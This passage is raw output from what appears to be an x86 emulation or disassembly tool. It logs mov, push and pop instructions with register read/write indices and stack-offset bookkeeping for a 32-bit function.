() adjusting stack for ESP -0x1c and offset 0x77b8 for stack size 0x10000 saving data to stack: 0 4 0x42192f: mov dword ptr [ebp - 0x844], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77bc for stack size 0x10000 saving data to stack: 0 4 0x421935: mov eax, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x42193b: mov edi, dword ptr [eax - 0x27c], regs_read: [19], regs_write: [23] 0x421941: mov esi, dword ptr [eax - 0x280], regs_read: [19], regs_write: [29] 0x421947: mov ecx, dword ptr [eax - 0x380], regs_read: [19], regs_write: [22] 0x42194d: mov eax, ecx, regs_read: [22], regs_write: [19] 0x421951: mov ebx, edx, regs_read: [24], regs_write: [21] 0x42195b: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421969: mov edx, dword ptr [ecx - 0x7c], regs_read: [22], regs_write: [24] 0x42196e: mov dword ptr [ebp - 0x818], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e8 for stack size 0x10000 saving data to stack: 0 4 0x421979: mov ecx, dword ptr [ecx - 0x180], regs_read: [22], regs_write: [22] 0x42197f: mov dword ptr [ebp - 0x810], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f0 for stack size 0x10000 saving data to stack: 0 4 0x421985: mov dword ptr [ebp - 0x824], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x77dc for stack size 0x10000 saving data to stack: 0 4 0x42198f: mov eax, ecx, regs_read: [22], regs_write: [19] 0x42199b: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x4219ad: mov dword ptr [ebp - 0x820], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e0 for stack size 0x10000 saving data to stack: 0 4 0x4219b7: mov ecx, edx, regs_read: [24], regs_write: [22] 0x4219b9: mov dword ptr [ebp - 0x838], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77c8 for stack size 0x10000 saving data to stack: 0 4 0x4219c3: mov edi, eax, regs_read: [19], regs_write: [23] 0x4219d1: mov eax, dword ptr [ebp - 0x818], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77e8 for stack size 0x10000 0x4219ef: mov dword ptr [ebp - 0x874], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x778c for stack size 0x10000 saving data to stack: 0 4 0x4219fd: mov ecx, edx, regs_read: [24], regs_write: [22] 0x4219ff: mov dword ptr [ebp - 0x880], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x7780 for stack size 0x10000 saving data to stack: 0 4 0x421a07: mov edx, eax, regs_read: [19], regs_write: [24] 0x421a17: mov eax, dword ptr [ebp - 0x820], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77e0 for stack size 0x10000 0x421a1f: mov dword ptr [ebp - 0x85c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77a4 for stack size 0x10000 saving data to stack: 0 4 0x421a27: mov dword ptr [ebp - 0x87c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x7784 for stack size 0x10000 saving data to stack: 0 4 0x421a41: mov dword ptr [ebp - 0x84c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77b4 for stack size 0x10000 saving data to stack: 0 4 0x421a4f: mov dword ptr [ebp - 0x88c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x7774 for stack size 0x10000 saving data to stack: 0 4 0x421a55: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421a59: mov edx, ecx, regs_read: [22], regs_write: [24] 0x421a6a: mov dword ptr [ebp - 0x81c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e4 for stack size 0x10000 saving data to stack: 0 4 0x421a70: mov dword ptr [ebp - 0x840], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77c0 for stack size 0x10000 saving data to stack: 0 4 0x421a76: mov eax, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421a7c: mov edi, dword ptr [eax - 0x204], regs_read: [19], regs_write: [23] 0x421a82: mov esi, dword ptr [eax - 0x208], regs_read: [19], regs_write: [29] 0x421a88: mov ecx, dword ptr [eax - 0x308], regs_read: [19], regs_write: [22] 0x421a8e: mov eax, ecx, regs_read: [22], regs_write: [19] 0x421a92: mov ebx, edx, regs_read: [24], regs_write: [21] 0x421a9c: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421aaa: mov edx, dword ptr [ecx - 4], regs_read: [22], regs_write: [24] 0x421aaf: mov dword ptr [ebp - 0x818], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e8 for stack size 0x10000 saving data to stack: 0 4 0x421aba: mov ecx, dword ptr [ecx - 0x108], regs_read: [22], regs_write: [22] 0x421ac0: mov dword ptr [ebp - 0x810], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f0 for stack size 0x10000 saving data to stack: 0 4 0x421ac6: mov dword ptr [ebp - 0x824], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x77dc for stack size 0x10000 saving data to stack: 0 4 0x421ad0: mov eax, ecx, regs_read: [22], regs_write: [19] 0x421adc: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421aee: mov dword ptr [ebp - 0x820], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e0 for stack size 0x10000 saving data to stack: 0 4 0x421af8: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421afa: mov dword ptr [ebp - 0x838], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77c8 for stack size 0x10000 saving data to stack: 0 4 0x421b04: mov edi, eax, regs_read: [19], regs_write: [23] 0x421b12: mov eax, dword ptr [ebp - 0x818], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77e8 for stack size 0x10000 0x421b30: mov dword ptr [ebp - 0x870], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x7790 for stack size 0x10000 saving data to stack: 0 4 0x421b3e: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421b40: mov dword ptr [ebp - 0x86c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x7794 for stack size 0x10000 saving data to stack: 0 4 0x421b48: mov edx, eax, regs_read: [19], regs_write: [24] 0x421b58: mov eax, dword ptr [ebp - 0x820], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77e0 for stack size 0x10000 0x421b60: mov dword ptr [ebp - 0x850], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77b0 for stack size 0x10000 saving data to stack: 0 4 0x421b66: mov dword ptr [ebp - 0x898], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x7768 for stack size 0x10000 saving data to stack: 0 4 0x421b82: mov dword ptr [ebp - 0x894], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x776c for stack size 0x10000 saving data to stack: 0 4 0x421b90: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421b92: mov dword ptr [ebp - 0x890], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x7770 for stack size 0x10000 saving data to stack: 0 4 0x421b9a: mov edx, ecx, regs_read: [22], regs_write: [24] 0x421bab: mov dword ptr [ebp - 0x83c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77c4 for stack size 0x10000 saving data to stack: 0 4 0x421bb1: mov dword ptr [ebp - 0x80c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f4 for stack size 0x10000 saving data to stack: 0 4 0x421bb7: mov eax, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421bbd: mov edi, dword ptr [eax - 0x1fc], regs_read: [19], regs_write: [23] 0x421bc3: mov esi, dword ptr [eax - 0x200], regs_read: [19], regs_write: [29] 0x421bc9: mov ecx, dword ptr [eax - 0x300], regs_read: [19], regs_write: [22] 0x421bcf: mov eax, ecx, regs_read: [22], regs_write: [19] 0x421bd3: mov ebx, edx, regs_read: [24], regs_write: [21] 0x421bdd: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421beb: mov edx, dword ptr [ecx + 4], regs_read: [22], regs_write: [24] 0x421bf0: mov dword ptr [ebp - 0x818], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e8 for stack size 0x10000 saving data to stack: 0 4 0x421bfa: mov ecx, dword ptr [ecx - 0x100], regs_read: [22], regs_write: [22] 0x421c00: mov dword ptr [ebp - 0x824], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x1c and offset 0x77dc for stack size 0x10000 saving data to stack: 0 4 0x421c0a: mov dword ptr [ebp - 0x810], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f0 for stack size 0x10000 saving data to stack: 0 4 0x421c10: mov eax, ecx, regs_read: [22], regs_write: [19] 0x421c1c: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421c2e: mov dword ptr [ebp - 0x820], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e0 for stack size 0x10000 saving data to stack: 0 4 0x421c38: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421c3a: mov dword ptr [ebp - 0x838], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77c8 for stack size 0x10000 saving data to stack: 0 4 0x421c44: mov edi, eax, regs_read: [19], regs_write: [23] 0x421c52: mov eax, dword ptr [ebp - 0x818], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77e8 for stack size 0x10000 0x421c5c: mov dword ptr [ebp - 0x864], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x1c and offset 0x779c for stack size 0x10000 saving data to stack: 0 4 0x421c76: mov dword ptr [ebp - 0x868], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x7798 for stack size 0x10000 saving data to stack: 0 4 0x421c84: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421c86: mov dword ptr [ebp - 0x888], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x7778 for stack size 0x10000 saving data to stack: 0 4 0x421c8e: mov ebx, eax, regs_read: [19], regs_write: [21] 0x421ca0: mov eax, dword ptr [ebp - 0x820], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77e0 for stack size 0x10000 0x421cbc: mov dword ptr [ebp - 0x82c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d4 for stack size 0x10000 saving data to stack: 0 4 0x421cc6: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421cc8: mov dword ptr [ebp - 0x838], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77c8 for stack size 0x10000 saving data to stack: 0 4 0x421cd4: mov edx, ecx, regs_read: [22], regs_write: [24] 0x421ce5: mov dword ptr [ebp - 0x828], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77d8 for stack size 0x10000 saving data to stack: 0 4 0x421ceb: mov dword ptr [ebp - 0x854], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77ac for stack size 0x10000 saving data to stack: 0 4 0x421cf1: mov eax, dword ptr [ebp - 0x814], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77ec for stack size 0x10000 0x421cfd: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421d17: mov dword ptr [ebp - 0x818], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e8 for stack size 0x10000 saving data to stack: 0 4 0x421d25: mov edi, ecx, regs_read: [22], regs_write: [23] 0x421d27: mov dword ptr [ebp - 0x824], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x77dc for stack size 0x10000 saving data to stack: 0 4 0x421d33: mov eax, dword ptr [ebp - 0x894], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x776c for stack size 0x10000 0x421d3b: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421d51: mov dword ptr [ebp - 0x810], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f0 for stack size 0x10000 saving data to stack: 0 4 0x421d5f: mov edx, eax, regs_read: [19], regs_write: [24] 0x421d61: mov dword ptr [ebp - 0x820], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e0 for stack size 0x10000 saving data to stack: 0 4 0x421d7b: mov eax, dword ptr [ebp - 0x818], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77e8 for stack size 0x10000 0x421d83: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421d89: mov dword ptr [ebp - 0x814], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77ec for stack size 0x10000 saving data to stack: 0 4 0x421da5: mov dword ptr [ecx - 0x388], eax, regs_read: [22, 19], regs_write: () 0x421db3: mov dword ptr [ecx - 0x384], edx, regs_read: [22, 24], regs_write: () 0x421db9: mov edi, eax, regs_read: [19], regs_write: [23] 0x421dcd: mov eax, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421dd3: mov dword ptr [eax], ecx, regs_read: [19, 22], regs_write: () 0x421dd5: mov dword ptr [eax + 4], edi, regs_read: [19, 23], regs_write: () 0x421dd8: mov eax, dword ptr [ebp - 0x810], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f0 for stack size 0x10000 0x421de0: mov esi, eax, regs_read: [19], regs_write: [29] 0x421df8: mov edi, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421e00: mov dword ptr [edi - 0x104], edx, regs_read: [23, 24], regs_write: () 0x421e0c: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421e0e: mov dword ptr [edi - 0x108], esi, regs_read: [23, 29], regs_write: () 0x421e21: mov dword ptr [edi - 0x27c], eax, regs_read: [23, 19], regs_write: () 0x421e29: mov eax, dword ptr [ebp - 0x874], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x778c for stack size 0x10000 0x421e35: mov dword ptr [edi - 0x280], ecx, regs_read: [23, 22], regs_write: () 0x421e3b: mov ebx, eax, regs_read: [19], regs_write: [21] 0x421e3d: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421e57: mov eax, ebx, regs_read: [21], regs_write: [19] 0x421e67: mov edi, ecx, regs_read: [22], regs_write: [23] 0x421e71: mov eax, dword ptr [ebp - 0x82c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77d4 for stack size 0x10000 0x421e79: mov dword ptr [ebp - 0x818], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e8 for stack size 0x10000 saving data to stack: 0 4 0x421e7f: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421e95: mov dword ptr [ebp - 0x810], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f0 for stack size 0x10000 saving data to stack: 0 4 0x421ea3: mov edx, eax, regs_read: [19], regs_write: [24] 0x421ea5: mov dword ptr [ebp - 0x820], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e0 for stack size 0x10000 saving data to stack: 0 4 0x421eb8: mov dword ptr [ebp - 0x80c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f4 for stack size 0x10000 saving data to stack: 0 4 0x421ecb: mov eax, ebx, regs_read: [21], regs_write: [19] 0x421ecd: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421ed3: mov dword ptr [ebp - 0x824], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77dc for stack size 0x10000 saving data to stack: 0 4 0x421eef: mov dword ptr [ecx - 0x380], eax, regs_read: [22, 19], regs_write: () 0x421efd: mov dword ptr [ecx - 0x37c], edx, regs_read: [22, 24], regs_write: () 0x421f03: mov edi, eax, regs_read: [19], regs_write: [23] 0x421f15: mov eax, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421f1d: mov dword ptr [eax - 0x88], ecx, regs_read: [19, 22], regs_write: () 0x421f23: mov dword ptr [eax - 0x84], edi, regs_read: [19, 23], regs_write: () 0x421f29: mov eax, dword ptr [ebp - 0x810], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f0 for stack size 0x10000 0x421f31: mov esi, eax, regs_read: [19], regs_write: [29] 0x421f49: mov edi, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x421f51: mov dword ptr [edi - 0xfc], edx, regs_read: [23, 24], regs_write: () 0x421f5d: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421f5f: mov dword ptr [edi - 0x100], esi, regs_read: [23, 29], regs_write: () 0x421f76: mov dword ptr [edi - 0x204], eax, regs_read: [23, 19], regs_write: () 0x421f7e: mov eax, dword ptr [ebp - 0x870], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7790 for stack size 0x10000 0x421f8a: mov dword ptr [edi - 0x208], ecx, regs_read: [23, 22], regs_write: () 0x421f90: mov ebx, eax, regs_read: [19], regs_write: [21] 0x421f92: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421fac: mov eax, ebx, regs_read: [21], regs_write: [19] 0x421fbc: mov edi, ecx, regs_read: [22], regs_write: [23] 0x421fc6: mov eax, dword ptr [ebp - 0x858], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77a8 for stack size 0x10000 0x421fce: mov dword ptr [ebp - 0x818], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e8 for stack size 0x10000 saving data to stack: 0 4 0x421fd4: mov ecx, edx, regs_read: [24], regs_write: [22] 0x421fea: mov dword ptr [ebp - 0x810], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f0 for stack size 0x10000 saving data to stack: 0 4 0x421ff8: mov edx, eax, regs_read: [19], regs_write: [24] 0x421ffa: mov dword ptr [ebp - 0x820], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x77e0 for stack size 0x10000 saving data to stack: 0 4 0x42200d: mov dword ptr [ebp - 0x80c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f4 for stack size 0x10000 saving data to stack: 0 4 0x422020: mov eax, ebx, regs_read: [21], regs_write: [19] 0x422022: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x422028: mov dword ptr [ebp - 0x824], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77dc for stack size 0x10000 saving data to stack: 0 4 0x422044: mov dword ptr [ecx - 0x308], eax, regs_read: [22, 19], regs_write: () 0x422050: mov dword ptr [ecx - 0x304], edx, regs_read: [22, 24], regs_write: () 0x42205a: mov edi, eax, regs_read: [19], regs_write: [23] 0x42206a: mov eax, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x422072: mov dword ptr [eax - 0x80], ecx, regs_read: [19, 22], regs_write: () 0x422075: mov dword ptr [eax - 0x7c], edi, regs_read: [19, 23], regs_write: () 0x422078: mov eax, dword ptr [ebp - 0x810], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f0 for stack size 0x10000 0x422080: mov esi, eax, regs_read: [19], regs_write: [29] 0x422098: mov edi, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x4220a0: mov dword ptr [edi - 0x184], edx, regs_read: [23, 24], regs_write: () 0x4220ac: mov ecx, edx, regs_read: [24], regs_write: [22] 0x4220ae: mov dword ptr [edi - 0x188], esi, regs_read: [23, 29], regs_write: () 0x4220c5: mov dword ptr [edi - 0x1fc], eax, regs_read: [23, 19], regs_write: () 0x4220cd: mov eax, dword ptr [ebp - 0x868], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7798 for stack size 0x10000 0x4220d9: mov dword ptr [edi - 0x200], ecx, regs_read: [23, 22], regs_write: () 0x4220df: mov ebx, eax, regs_read: [19], regs_write: [21] 0x4220e1: mov ecx, edx, regs_read: [24], regs_write: [22] 0x4220fb: mov eax, ebx, regs_read: [21], regs_write: [19] 0x42210b: mov edi, ecx, regs_read: [22], regs_write: [23] 0x422115: mov eax, dword ptr [ebp - 0x84c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77b4 for stack size 0x10000 0x42211d: mov dword ptr [ebp - 0x888], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x7778 for stack size 0x10000 saving data to stack: 0 4 0x422123: mov ecx, edx, regs_read: [24], regs_write: [22] 0x422139: mov dword ptr [ebp - 0x810], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f0 for stack size 0x10000 saving data to stack: 0 4 0x422147: mov edx, eax, regs_read: [19], regs_write: [24] 0x422149: mov dword ptr [ebp - 0x88c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x7774 for stack size 0x10000 saving data to stack: 0 4 0x42215c: mov dword ptr [ebp - 0x80c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f4 for stack size 0x10000 saving data to stack: 0 4 0x42216f: mov eax, ebx, regs_read: [21], regs_write: [19] 0x422171: mov dword ptr [ebp - 0x814], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x77ec for stack size 0x10000 saving data to stack: 0 4 0x42218d: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x422199: mov dword ptr [ecx - 0x300], eax, regs_read: [22, 19], regs_write: () 0x4221a1: mov dword ptr [ecx - 0x2fc], edx, regs_read: [22, 24], regs_write: () 0x4221a7: mov ebx, eax, regs_read: [19], regs_write: [21] 0x4221b9: mov eax, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x4221c1: mov dword ptr [eax - 8], ecx, regs_read: [19, 22], regs_write: () 0x4221c4: mov dword ptr [eax - 4], ebx, regs_read: [19, 21], regs_write: () 0x4221c7: mov eax, dword ptr [ebp - 0x810], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x77f0 for stack size 0x10000 0x4221cf: mov edi, edx, regs_read: [24], regs_write: [23] 0x4221d1: mov esi, eax, regs_read: [19], regs_write: [29] 0x4221e7: mov ecx, dword ptr [ebp - 0x808], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 0x4221f1: mov dword ptr [ecx - 0x180], esi, regs_read: [22, 29], regs_write: () 0x4221fd: mov dword ptr [ecx - 0x17c], edi, regs_read: [22, 23], regs_write: () 0x422209: mov edx, edi, regs_read: [23], regs_write: [24] 0x422218: mov dword ptr [ecx - 0x284], eax, regs_read: [22, 19], regs_write: () 0x42221e: mov dword ptr [ecx - 0x288], edx, regs_read: [22, 24], regs_write: () 0x42222e: mov dword ptr [ebp - 0x808], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x77f8 for stack size 0x10000 saving data to stack: 0 4 0x42223a: mov eax, dword ptr [ebp - 0x89c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7764 for stack size 0x10000 0x422246: mov edi, eax, regs_read: [19], regs_write: [23] 0x422248: mov ecx, 0x100, regs_read: (), regs_write: [22] 0x422255: push ecx, regs_read: [30, 22], regs_write: [30] 0x422256: push eax, regs_read: [30, 19], regs_write: [30] 0x42225c: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x24 and offset 0x7ffc for stack size 0x10000 0x422264: pop edi, regs_read: [30], regs_write: [30, 23] 0x422265: pop esi, regs_read: [30], regs_write: [30, 29] 0x422266: pop ebx, regs_read: [30], regs_write: [30, 21] 0x42226c: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x18 and offset 0x8000 for stack size 0x10000 0x42226e: pop ebp, regs_read: [30], regs_write: [30, 20] 0x422270: push ebp, regs_read: [30, 20], regs_write: [30] 0x422271: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x422273: mov eax, 0x1004, regs_read: (), regs_write: [19] 0x42227d: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x422284: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 4100 4 0x422287: push ebx, regs_read: [30, 21], regs_write: [30] 0x422288: mov ebx, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x8010 for stack size 0x10000 0x422291: push 0x400, regs_read: [30], regs_write: [30] 0x422296: push 0, regs_read: [30], regs_write: [30] 0x422298: push eax, regs_read: [30, 19], regs_write: [30] 0x42229e: push 0x3d0, regs_read: [30], regs_write: [30] 0x4222a9: push 0, regs_read: [30], regs_write: [30] 0x4222ab: push eax, regs_read: [30, 19], regs_write: [30] 0x4222b1: mov ecx, dword ptr [ebp + 8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x8008 for stack size 0x10000 0x4222bf: mov edx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x1c and offset 0x800c for stack size 0x10000 0x4222ca: mov eax, dword ptr [edx], regs_read: [24], regs_write: [19] 0x4222cc: mov dword ptr [ebp - 0x1004], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x6ffc for stack size 0x10000 saving data to stack: 4100 4 0x4222d2: mov eax, dword ptr [edx + 4], regs_read: [24], regs_write: [19] 0x4222d5: mov dword ptr [ebp - 0xffc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x7004 for stack size 0x10000 saving data to stack: 4100 4 0x4222e0: mov dword ptr [ebp - 0xff4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x700c for stack size 0x10000 saving data to stack: 4100 4 0x4222e6: mov eax, dword ptr [ecx + 0x10], regs_read: [22], regs_write: [19] 0x4222e9: mov dword ptr [ebp - 0xfec], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x7014 for stack size 0x10000 saving data to stack: 4100 4 0x4222ef: mov eax, dword ptr [ecx + 8], regs_read: [22], regs_write: [19] 0x4222f2: mov dword ptr [ebp - 0xfe4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x701c for stack size 0x10000 saving data to stack: 4100 4 0x4222f8: mov eax, dword ptr [ecx + 0x24], regs_read: [22], regs_write: [19] 0x4222fb: push esi, regs_read: [30, 29], regs_write: [30] 0x4222fc: mov dword ptr [ebp - 0xff0], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x20 and offset 0x7010 for stack size 0x10000 saving data to stack: 0 4 0x422305: mov dword ptr [ebp - 0x1000], 0, regs_read: [20], regs_write: () adjusting stack for ESP -0x20 and offset 0x7000 for stack size 0x10000 saving data to stack: 0 4 0x42230f: mov dword ptr [ebp - 0xff8], 0, regs_read: [20], regs_write: () adjusting stack for ESP -0x20 and offset 0x7008 for stack size 0x10000 saving data to stack: 0 4 0x422319: mov dword ptr [ebp - 0xfe8], 0, regs_read: [20], regs_write: () adjusting stack for ESP -0x20 and offset 0x7018 for stack size 0x10000 saving data to stack: 0 4 0x422323: mov dword ptr [ebp - 0xfe0], 0, regs_read: [20], regs_write: () adjusting stack for ESP -0x20 and offset 0x7020 for stack size 0x10000 saving data to stack: 0 4 0x42232d: mov dword ptr 